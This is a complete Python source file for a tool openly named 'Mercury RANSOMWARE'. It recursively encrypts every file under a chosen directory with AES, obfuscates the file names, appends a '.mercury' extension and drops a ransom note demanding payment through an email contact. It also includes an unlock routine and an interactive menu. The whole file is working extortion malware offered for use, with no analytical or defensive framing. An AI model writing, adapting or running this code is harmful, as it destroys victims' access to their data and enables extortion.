# Mercury RANSOMWARE

# 1) ./mercury.py (show help)
# 2) ./mercury.py menu (use menu instead of command args)

version = "v1.2"

import os
import threading
import base64
import subprocess
import sys
from colorama import Fore, Style
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.exceptions import InvalidSignature

BLOCK_SIZE = 128
SALT_SIZE = 16
LOCK_EXTENSION = '.mercury'
README_NAME = 'README.mercury'

red = Fore.LIGHTRED_EX
yellow = Fore.YELLOW
white = Fore.LIGHTWHITE_EX
grey = Fore.LIGHTBLACK_EX


def generate_salt() -> bytes:
    return os.urandom(SALT_SIZE)


def generate_key(passkey: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(passkey.encode())


def encrypt_data(data: bytes, key: bytes) -> bytes:
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(BLOCK_SIZE).padder()
    padded_data = padder.update(data) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return iv + encrypted_data


def decrypt_data(encrypted_data: bytes, key: bytes) -> bytes:
    try:
        iv = encrypted_data[:16]
        encrypted_content = encrypted_data[16:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_content) + decryptor.finalize()
        unpadder = padding.PKCS7(BLOCK_SIZE).unpadder()
        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
        return unpadded_data
    except ValueError as e:
        print(f"Decryption error: {e}. This could be due to an incorrect key, corrupted file, or invalid padding.")
        return None


def xor_crypt_string(data: str, key: bytes) -> bytes:
    key_len = len(key)
    xor_result = bytes([ord(char) ^ key[i % key_len] for i, char in enumerate(data)])
    return base64.urlsafe_b64encode(xor_result).rstrip(b'=')


def xor_decrypt_string(data: bytes, key: bytes) -> str:
    decoded = base64.urlsafe_b64decode(data + b'=' * (-len(data) % 4))
    key_len = len(key)
    return ''.join(chr(decoded[i] ^ key[i % key_len]) for i in range(len(decoded)))


def encrypt_filename(filename: str, key: bytes) -> str:
    return xor_crypt_string(filename, key).decode()


def decrypt_filename(encrypted_filename: str, key: bytes) -> str:
    return xor_decrypt_string(encrypted_filename.encode(), key)


def encrypt_file(filepath: str, passkey: str):
    salt = generate_salt()
    key = generate_key(passkey, salt)
    with open(filepath, 'rb') as f:
        data = f.read()
    encrypted_data = encrypt_data(data, key)
    encrypted_data_with_salt = salt + encrypted_data
    with open(filepath, 'wb') as f:
        f.write(encrypted_data_with_salt)
    directory, filename = os.path.split(filepath)
    encrypted_name = encrypt_filename(filename, key)
    os.rename(filepath, os.path.join(directory, encrypted_name + LOCK_EXTENSION))


def decrypt_file(filepath: str, passkey: str):
    with open(filepath, 'rb') as f:
        encrypted_data_with_salt = f.read()
    salt = encrypted_data_with_salt[:SALT_SIZE]
    encrypted_data = encrypted_data_with_salt[SALT_SIZE:]
    key = generate_key(passkey, salt)
    decrypted_data = decrypt_data(encrypted_data, key)
    if decrypted_data is None:
        print(f"Error decrypting {filepath}. Skipping this file.")
        return
    with open(filepath, 'wb') as f:
        f.write(decrypted_data)
    directory, filename = os.path.split(filepath)
    decrypted_name = decrypt_filename(filename.replace(LOCK_EXTENSION, ''), key)
    os.rename(filepath, os.path.join(directory, decrypted_name))


def process_directory(directory: str, passkey: str, encrypt=True):
    threads = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file == README_NAME:
                continue
            filepath = os.path.join(root, file)
            thread = threading.Thread(target=encrypt_file if encrypt else decrypt_file, args=(filepath, passkey))
            thread.start()
            threads.append(thread)
        for d in dirs:
            process_directory(os.path.join(root, d), passkey, encrypt)
    for thread in threads:
        thread.join()


def create_readme(directory: str, email: str):
    directory = os.path.expanduser(directory)
    readme_content = f"""
                                     YOUR FILES HAVE BEEN ENCRYPTED!


    All important data on this system is now inaccessible. To restore access, you must make a payment.
    The exact details of the payment will be provided once you contact us. Failure to act within a limited
    timeframe will result in the permanent loss of your data.

    We strongly advise against attempting to recover your files through other means, as it may result in
    irreparable damage. Only we hold the key necessary for decryption.

    To proceed, reach out to us immediately at the provided email: [{email}]

    Time is limited—act quickly.
                    """
    readme_path = os.path.join(directory, README_NAME)
    with open(readme_path, 'w') as f:
        f.write(readme_content)


def lock(directory: str, passkey: str, email: str):
    directory = os.path.expanduser(directory)
    process_directory(directory, passkey, encrypt=True)
    create_readme(directory, email)


def unlock(directory: str, passkey: str):
    directory = os.path.expanduser(directory)
    os.remove(f"{directory}/README.mercury")
    process_directory(directory, passkey, encrypt=False)


def menu():
    print(f"""

   {red}____  _____  ____ ____ {yellow}_   _  ____ _   _
  {red}|    \\| ___ |/ ___) ___){yellow} | | |/ ___) | | |
  {red}| | | | ____| |  ( (___{yellow}| |_| | |   | |_| |
  {red}|_|_|_|_____)_|   \\____){yellow}____/|_|    \\__  |
                                     (____/ {white}{version}
                 {white}RANSOMWARE

 {grey}'?' for help
    """)
    while True:
        command = input(f" {red}Merc{yellow}ury {grey}{version} >{white} ").strip()
        if command == "?":
            print("""
        Usage:
                lock /start/dir p4ssk3y (optional: ransom@email.com)
                unlock /start/dir p4ssk3y

                exit
            """)
        elif command.startswith("lock"):
            parts = command.split()
            if len(parts) < 3:
                print("Usage:\n  lock /start/dir p4ssk3y (optional: ransom@email.com)")
                continue
            directory = parts[1]
            passkey = parts[2]
            email = parts[3] if len(parts) == 4 else "No contact provided"
            lock(directory, passkey, email)
            print(f"\n{red} Encrypted files under starting dir: {white}{directory}{red} with key: {yellow}{passkey}\n")
        elif command.startswith("unlock"):
            parts = command.split()
            if len(parts) != 3:
                print("Usage:\n  unlock /start/dir p4ssk3y")
                continue
            directory = parts[1]
            passkey = parts[2]
            unlock(directory, passkey)
            print(f"\n{red} Decrypted files under starting dir: {white}{directory}{red} with key: {yellow}{passkey}\n")
        elif command == "exit":
            sys.exit()
        else:
            print("Unknown command. Type '?' for help.")


def core():
    if len(sys.argv) < 2:
        print(f"""
        {red}Merc{yellow}ury {white}RANSOMWARE {version}

        {grey}Designed for efficient, high-speed encryption through balanced multi-threading.
        It begins in a specified directory and recursively encrypts files in all sub-
        directories, ensuring comprehensive coverage without overloading system resources.
        After completing the encryption process, it generates a ransom note in the original
        directory, which includes your contact email (from command)

        {white}Usage:

                ./mercury.py menu (opens CLI Menu)

                ./mercury.py lock /start/dir p4ssk3y (optional: ransom@email.com)
                ./mercury.py unlock /start/dir p4ssk3y
        """)
        return

    command = sys.argv[1]

    if command == "menu":
        menu()
    elif command == "lock" and len(sys.argv) >= 4:
        directory = sys.argv[2]
        passkey = sys.argv[3]
        email = sys.argv[4] if len(sys.argv) == 5 else "No contact provided"
        lock(directory, passkey, email)
    elif command == "unlock" and len(sys.argv) == 4:
        directory = sys.argv[2]
        passkey = sys.argv[3]
        unlock(directory, passkey)
    else:
        print("Invalid command or missing arguments. Use 'menu' for interactive mode.")


core()
